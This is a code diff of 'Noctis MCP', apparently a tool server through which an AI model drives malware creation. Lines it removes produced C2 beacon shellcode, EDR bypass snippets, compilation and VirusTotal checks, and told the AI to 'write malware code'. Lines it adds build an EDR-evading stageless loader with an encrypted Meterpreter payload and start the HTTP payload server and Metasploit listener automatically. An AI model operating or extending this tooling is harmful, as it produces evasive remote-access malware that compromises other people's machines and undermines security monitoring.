@@ -1,15 +1,11 @@
 #!/usr/bin/env python3
 """
-Noctis MCP v3.0 - Fully Automated Malware Generator
-5 Core Tools for Dynamic Malware Generation
+Noctis MCP v3.0 - Stageless Loader MCP Tools
+Fully automated EDR-bypassing stageless loaders
 """
 import sys
-import os
 import requests
 from pathlib import Path
-
-# Add parent to path
-sys.path.insert(0, str(Path(__file__).parent.parent))
 
 try:
     from fastmcp import FastMCP
@@ -22,267 +18,343 @@ SERVER_URL = "http://localhost:8888"
 
 
 @mcp.tool()
-def noctis_get_edr_bypasses(target_edr: str) -> str:
-    """
-    Get bypass techniques for specific EDR.
-
-    Args:
-        target_edr: EDR name (CrowdStrike, Defender, SentinelOne, etc.)
-
-    Returns:
-        Techniques that work against this EDR with code snippets
-    """
-    try:
-        response = requests.post(f"{SERVER_URL}/api/get_bypasses",
-                                json={"edr": target_edr}, timeout=30)
-
-        if response.status_code == 200:
-            data = response.json()
-
-            output = []
-            output.append("=" * 70)
-            output.append(f"  EDR BYPASSES: {target_edr}")
-            output.append("=" * 70)
-            output.append("")
-            output.append(f"Recommended Techniques:")
-            for i, tech in enumerate(data.get('techniques', []), 1):
-                output.append(f"  {i}. {tech}")
-            output.append("")
-            output.append(f"Code Snippets:")
-            for snippet in data.get('snippets', []):
-                output.append(f"\n{snippet}")
-            output.append("")
-            output.append("=" * 70)
-            output.append("Next: AI writes malware code using these techniques")
-            output.append("=" * 70)
-
-            return "\n".join(output)
-        else:
-            return f"ERROR: {response.text}"
-    except Exception as e:
-        return f"ERROR: Server not running. Start with: python server/noctis_server.py\n{e}"
-
-
-@mcp.tool()
-def noctis_generate_beacon(
-    c2_type: str,
-    listener_ip: str,
-    listener_port: int = 443,
-    architecture: str = "x64"
+def noctis_generate_stageless_loader(
+    lhost: str,
+    lport: int = 4444,
+    http_port: int = 8080,
+    auto_start_servers: bool = True
 ) -> str:
     """
-    Generate C2 beacon shellcode with ANY IP address.
+    Generate complete stageless loader system and optionally start servers.
+
+    This is the MAIN tool - does EVERYTHING automatically!
+    User only needs to run the loader.exe on Windows.
 
     Args:
-        c2_type: "sliver" or "msfvenom"
-        listener_ip: IP address (10.0.0.1, 192.168.1.5, public IP, etc.)
-        listener_port: Port (default 443)
-        architecture: "x64" or "x86"
+        lhost: Your Kali IP address (e.g., "192.168.1.56")
+        lport: Meterpreter listener port (default: 4444)
+        http_port: HTTP server port for payload delivery (default: 8080)
+        auto_start_servers: Automatically start HTTP server and MSF listener (default: True)
 
     Returns:
-        Shellcode in C array format ready to paste into code
+        Complete status with all generated files and running services
     """
     try:
-        response = requests.post(f"{SERVER_URL}/api/generate_beacon",
-                                json={
-                                    "c2_type": c2_type,
-                                    "listener_ip": listener_ip,
-                                    "listener_port": listener_port,
-                                    "architecture": architecture
-                                }, timeout=90)
+        # Step 1: Generate loader system
+        response = requests.post(
+            f"{SERVER_URL}/api/generate_stageless_loader",
+            json={
+                'lhost': lhost,
+                'lport': lport,
+                'http_port': http_port
+            },
+            timeout=120
+        )
 
-        if response.status_code == 200:
+        if response.status_code != 200:
             data = response.json()
+            return f"ERROR: Generation failed\n{data.get('error', response.text)}"
 
-            if not data.get('success'):
-                return f"ERROR: {data.get('error')}\nHint: {data.get('hint', '')}"
+        data = response.json()
+        if not data.get('success'):
+            return f"ERROR: {data.get('error')}"
 
-            output = []
+        output = []
+        output.append("=" * 70)
+        output.append("  ✅ STAGELESS LOADER GENERATED!")
+        output.append("=" * 70)
+        output.append("")
+        output.append(f"LHOST: {data['lhost']}")
+        output.append(f"LPORT: {data['lport']}")
+        output.append(f"HTTP Port: {data['http_port']}")
+        output.append(f"Output: {data['work_dir']}")
+        output.append("")
+        output.append("Generated files:")
+        output.append(f"  ✓ staged_loader.exe ({data['loader_size']:,} bytes) - CLEAN, NO MSFVenom!")
+        output.append(f"  ✓ payload.enc ({data['payload_size']:,} bytes) - RC4 encrypted")
+        output.append(f"  ✓ start_server.sh - HTTP server script")
+        output.append(f"  ✓ start_listener.sh - Metasploit listener script")
+        output.append("")
+
+        # Step 2: Auto-start servers if requested
+        if auto_start_servers:
             output.append("=" * 70)
-            output.append(f"  BEACON GENERATED: {c2_type.upper()}")
+            output.append("  🚀 STARTING SERVERS AUTOMATICALLY...")
             output.append("=" * 70)
-            output.append(f"Listener: {data['listener']}")
-            output.append(f"Architecture: {data['architecture']}")
-            output.append(f"Shellcode Size: {data['shellcode_size']} bytes")
-            output.append(f"File: {data['shellcode_path']}")
             output.append("")
-            output.append("C Array (copy this into your code):")
-            output.append("-" * 70)
-            output.append(data['c_array'])
-            output.append("-" * 70)
+
+            # Start HTTP server
+            http_response = requests.post(
+                f"{SERVER_URL}/api/start_http_server",
+                json={'port': http_port},
+                timeout=30
+            )
+
+            if http_response.status_code == 200:
+                http_data = http_response.json()
+                if http_data.get('success'):
+                    output.append(f"✅ HTTP Server: RUNNING on port {http_data['port']}")
+                    output.append(f"   Serving: {http_data['payload_url']}")
+                    output.append(f"   PID: {http_data['pid']}")
+                else:
+                    output.append(f"⚠️  HTTP Server: {http_data.get('error')}")
+            else:
+                output.append(f"⚠️  HTTP Server: Failed to start")
+
             output.append("")
-            output.append("=" * 70)
-            output.append("Next: AI integrates this shellcode into malware code")
-            output.append("=" * 70)
 
-            return "\n".join(output)
-        else:
-            return f"ERROR: {response.text}"
-    except Exception as e:
-        return f"ERROR: {str(e)}"
+            # Start Metasploit listener
+            msf_response = requests.post(
+                f"{SERVER_URL}/api/start_msf_listener",
+                json={'lhost': lhost, 'lport': lport},
+                timeout=30
+            )
 
+            if msf_response.status_code == 200:
+                msf_data = msf_response.json()
+                if msf_data.get('success'):
+                    output.append(f"✅ Metasploit Listener: RUNNING")
+                    output.append(f"   Listening: {msf_data['lhost']}:{msf_data['lport']}")
+                    output.append(f"   Payload: {msf_data['payload']}")
+                    output.append(f"   PID: {msf_data['pid']}")
+                else:
+                    output.append(f"⚠️  Metasploit Listener: {msf_data.get('error')}")
+            else:
+                output.append(f"⚠️  Metasploit Listener: Failed to start")
 
-@mcp.tool()
-def noctis_compile(
-    source_file: str,
-    target_edr: str = "generic",
-    architecture: str = "x64"
-) -> str:
-    """
-    Compile malware with EDR-specific optimizations.
-
-    Args:
-        source_file: Path to .c file (e.g., "my_beacon.c")
-        target_edr: Target EDR for optimizations
-        architecture: "x64" or "x86"
-
-    Returns:
-        Compiled binary path and details
-    """
-    try:
-        response = requests.post(f"{SERVER_URL}/api/compile",
-                                json={
-                                    "source_file": source_file,
-                                    "target_edr": target_edr,
-                                    "architecture": architecture
-                                }, timeout=120)
-
-        if response.status_code == 200:
-            data = response.json()
-
-            if not data.get('success'):
-                return f"ERROR: {data.get('error')}\nLogs:\n{data.get('logs', '')}"
-
-            output = []
-            output.append("=" * 70)
-            output.append(f"  COMPILATION SUCCESSFUL")
-            output.append("=" * 70)
-            output.append(f"Source: {data['source_file']}")
-            output.append(f"Binary: {data['binary_path']}")
-            output.append(f"Size: {data['binary_size']} bytes")
-            output.append(f"Target EDR: {target_edr}")
-            output.append(f"Architecture: {architecture}")
             output.append("")
-            output.append("Compiled with techniques:")
-            for tech in data.get('techniques', []):
-                output.append(f"  - {tech}")
-            output.append("")
-            output.append("=" * 70)
-            output.append("Next: Test beacon connection or test on VT")
-            output.append("=" * 70)
 
-            return "\n".join(output)
-        else:
-            return f"ERROR: {response.text}"
+        output.append("=" * 70)
+        output.append("  🎯 READY TO TEST!")
+        output.append("=" * 70)
+        output.append("")
+        output.append("Next steps:")
+        output.append(f"  1. Copy {data['loader_path']} to Windows VM")
+        output.append(f"  2. Run the loader on Windows")
+        output.append(f"  3. Watch Metasploit for incoming session!")
+        output.append("")
+        output.append("To stop servers:")
+        output.append("  - noctis_stop_servers()")
+        output.append("")
+        output.append("=" * 70)
+
+        return "\n".join(output)
+
+    except requests.exceptions.ConnectionError:
+        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
     except Exception as e:
         return f"ERROR: {str(e)}"
 
 
 @mcp.tool()
-def noctis_test_binary(
-    binary_path: str,
-    target_edr: str
-) -> str:
+def noctis_check_status() -> str:
     """
-    Test binary on VirusTotal (PROTOTYPES ONLY!).
-
-    Args:
-        binary_path: Path to compiled binary
-        target_edr: Check if this EDR detects it
+    Check complete system status (files + running processes).
 
     Returns:
-        Detection results
+        Status of all files and running servers
     """
     try:
-        response = requests.post(f"{SERVER_URL}/api/test_binary",
-                                json={
-                                    "binary_path": binary_path,
-                                    "target_edr": target_edr
-                                }, timeout=360)
+        # Check file status
+        file_response = requests.post(
+            f"{SERVER_URL}/api/check_status",
+            json={},
+            timeout=30
+        )
 
-        if response.status_code == 200:
-            data = response.json()
+        # Check process status
+        process_response = requests.get(
+            f"{SERVER_URL}/api/process_status",
+            timeout=30
+        )
 
-            if not data.get('success'):
-                return f"ERROR: {data.get('error')}"
+        output = []
+        output.append("=" * 70)
+        output.append("  NOCTIS STAGELESS LOADER - SYSTEM STATUS")
+        output.append("=" * 70)
+        output.append("")
 
-            output = []
-            output.append("=" * 70)
-            output.append(f"  VIRUSTOTAL RESULTS")
-            output.append("=" * 70)
-            output.append(f"Binary: {data['binary']}")
-            output.append(f"Detection: {data['detection_rate']}")
-            output.append(f"{target_edr}: {data['target_edr_result']}")
-            output.append("")
-            output.append("Top Detections:")
-            for detection in data.get('top_detections', []):
-                output.append(f"  - {detection}")
-            output.append("")
-            output.append("=" * 70)
-            output.append("⚠️  Remember: Test prototypes only, NOT final binary!")
-            output.append("=" * 70)
+        # File status
+        if file_response.status_code == 200:
+            file_data = file_response.json()
+            if file_data.get('success'):
+                output.append(f"📁 Files: {file_data['work_dir']}")
+                output.append("")
 
-            return "\n".join(output)
-        else:
-            return f"ERROR: {response.text}"
+                for filename, info in file_data['files'].items():
+                    if info['exists']:
+                        size = info['size']
+                        desc = info['description']
+                        output.append(f"  ✓ {filename:25s} {size:>10,} bytes - {desc}")
+                    else:
+                        desc = info['description']
+                        output.append(f"  ✗ {filename:25s} MISSING - {desc}")
+
+                output.append("")
+                if file_data['all_ready']:
+                    output.append("✅ All files present")
+                else:
+                    output.append("❌ Missing files - run noctis_generate_stageless_loader()")
+
+        output.append("")
+
+        # Process status
+        if process_response.status_code == 200:
+            proc_data = process_response.json()
+            if proc_data.get('success'):
+                output.append("🔧 Running Services:")
+                output.append("")
+
+                http_status = proc_data['processes']['http_server']
+                if http_status['running']:
+                    output.append(f"  ✅ HTTP Server: RUNNING (PID: {http_status['pid']})")
+                else:
+                    output.append(f"  ⚪ HTTP Server: NOT RUNNING")
+
+                msf_status = proc_data['processes']['msf_listener']
+                if msf_status['running']:
+                    output.append(f"  ✅ MSF Listener: RUNNING (PID: {msf_status['pid']})")
+                else:
+                    output.append(f"  ⚪ MSF Listener: NOT RUNNING")
+
+        output.append("")
+        output.append("=" * 70)
+
+        return "\n".join(output)
+
+    except requests.exceptions.ConnectionError:
+        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
     except Exception as e:
         return f"ERROR: {str(e)}"
 
 
 @mcp.tool()
-def noctis_record_result(
-    target_edr: str,
-    detected: bool,
-    techniques: str,
-    notes: str = ""
-) -> str:
+def noctis_start_servers(lhost: str, lport: int = 4444, http_port: int = 8080) -> str:
     """
-    Record test result for learning system.
+    Start HTTP server and Metasploit listener.
 
     Args:
-        target_edr: EDR tested against
-        detected: True if caught, False if bypassed
-        techniques: Comma-separated techniques used
-        notes: Additional notes
+        lhost: Your Kali IP
+        lport: Meterpreter listener port (default: 4444)
+        http_port: HTTP server port (default: 8080)
 
     Returns:
-        Updated statistics
+        Status of started servers
     """
     try:
-        tech_list = [t.strip() for t in techniques.split(',')]
+        output = []
+        output.append("=" * 70)
+        output.append("  🚀 STARTING SERVERS...")
+        output.append("=" * 70)
+        output.append("")
 
-        response = requests.post(f"{SERVER_URL}/api/record_result",
-                                json={
-                                    "target_edr": target_edr,
-                                    "detected": detected,
-                                    "techniques": tech_list,
-                                    "notes": notes
-                                }, timeout=30)
+        # Start HTTP server
+        http_response = requests.post(
+            f"{SERVER_URL}/api/start_http_server",
+            json={'port': http_port},
+            timeout=30
+        )
 
-        if response.status_code == 200:
-            data = response.json()
-
-            status = "✗ DETECTED" if detected else "✓ BYPASSED"
-
-            output = []
-            output.append("=" * 70)
-            output.append(f"  RESULT RECORDED: {status}")
-            output.append("=" * 70)
-            output.append(f"EDR: {target_edr}")
-            output.append(f"Techniques: {techniques}")
-            output.append(f"Notes: {notes if notes else 'None'}")
-            output.append("")
-            output.append(f"Updated Statistics:")
-            output.append(f"  Total Tests: {data.get('total_tests', 0)}")
-            output.append(f"  Bypass Rate: {data.get('bypass_rate', 0)}%")
-            output.append("")
-            output.append("=" * 70)
-            output.append("System learning updated - recommendations improved!")
-            output.append("=" * 70)
-
-            return "\n".join(output)
+        if http_response.status_code == 200:
+            http_data = http_response.json()
+            if http_data.get('success'):
+                output.append(f"✅ HTTP Server: RUNNING")
+                output.append(f"   Port: {http_data['port']}")
+                output.append(f"   Payload URL: {http_data['payload_url']}")
+                output.append(f"   PID: {http_data['pid']}")
+            else:
+                output.append(f"❌ HTTP Server: {http_data.get('error')}")
         else:
-            return f"ERROR: {response.text}"
+            output.append(f"❌ HTTP Server: Failed to start")
+
+        output.append("")
+
+        # Start Metasploit listener
+        msf_response = requests.post(
+            f"{SERVER_URL}/api/start_msf_listener",
+            json={'lhost': lhost, 'lport': lport},
+            timeout=30
+        )
+
+        if msf_response.status_code == 200:
+            msf_data = msf_response.json()
+            if msf_data.get('success'):
+                output.append(f"✅ Metasploit Listener: RUNNING")
+                output.append(f"   Listening: {msf_data['lhost']}:{msf_data['lport']}")
+                output.append(f"   Payload: {msf_data['payload']}")
+                output.append(f"   PID: {msf_data['pid']}")
+            else:
+                output.append(f"❌ Metasploit Listener: {msf_data.get('error')}")
+        else:
+            output.append(f"❌ Metasploit Listener: Failed to start")
+
+        output.append("")
+        output.append("=" * 70)
+
+        return "\n".join(output)
+
+    except requests.exceptions.ConnectionError:
+        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
+    except Exception as e:
+        return f"ERROR: {str(e)}"
+
+
+@mcp.tool()
+def noctis_stop_servers() -> str:
+    """
+    Stop all running servers (HTTP + Metasploit).
+
+    Returns:
+        Status of stopped servers
+    """
+    try:
+        output = []
+        output.append("=" * 70)
+        output.append("  🛑 STOPPING SERVERS...")
+        output.append("=" * 70)
+        output.append("")
+
+        # Stop HTTP server
+        http_response = requests.post(
+            f"{SERVER_URL}/api/stop_http_server",
+            json={},
+            timeout=30
+        )
+
+        if http_response.status_code == 200:
+            http_data = http_response.json()
+            if http_data.get('success'):
+                output.append(f"✅ HTTP Server: STOPPED")
+            else:
+                output.append(f"⚠️  HTTP Server: {http_data.get('error')}")
+        else:
+            output.append(f"❌ HTTP Server: Failed to stop")
+
+        output.append("")
+
+        # Stop Metasploit listener
+        msf_response = requests.post(
+            f"{SERVER_URL}/api/stop_msf_listener",
+            json={},
+            timeout=30
+        )
+
+        if msf_response.status_code == 200:
+            msf_data = msf_response.json()
+            if msf_data.get('success'):
+                output.append(f"✅ Metasploit Listener: STOPPED")
+            else:
+                output.append(f"⚠️  Metasploit Listener: {msf_data.get('error')}")
+        else:
+            output.append(f"❌ Metasploit Listener: Failed to stop")
+
+        output.append("")
+        output.append("=" * 70)
+
+        return "\n".join(output)
+
+    except requests.exceptions.ConnectionError:
+        return f"ERROR: Server not running. Start with:\n  python3 server/noctis_server.py"
     except Exception as e:
         return f"ERROR: {str(e)}"
 
@@ -290,4 +362,5 @@ def noctis_record_result(
 if __name__ == "__main__":
     print("[*] Noctis MCP v3.0 Starting...")
     print("[*] Server URL:", SERVER_URL)
+    print("[*] Tools: Fully Automated Stageless Loader")
     mcp.run(transport='stdio')
